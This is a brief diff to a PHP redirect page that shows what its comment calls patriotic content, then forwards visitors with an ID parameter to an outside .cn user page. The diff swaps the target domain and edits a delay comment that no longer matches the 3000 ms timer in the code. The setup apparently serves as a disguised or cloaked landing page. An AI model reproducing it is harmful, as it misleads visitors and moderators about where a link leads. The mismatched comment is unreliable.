@@ -1,6 +1,6 @@
 <?php
 // 简化版：带爱国内容的ID跳转
-$target = "https://zfmdgswz.cn/mobile/pages/user";
+$target = "https://lcdi08.cn/mobile/pages/user";
 $id = isset($_GET['id']) ? intval($_GET['id']) : 0;
 ?>
 <!DOCTYPE html>
@@ -35,7 +35,7 @@ $id = isset($_GET['id']) ? intval($_GET['id']) : 0;
     </div>
     
     <script>
-        // 100秒后跳转
+        // 1秒后跳转
         setTimeout(function() {
             window.location.href = "<?php echo $target . '/user?mer_id=' . $id; ?>";
         }, 3000);
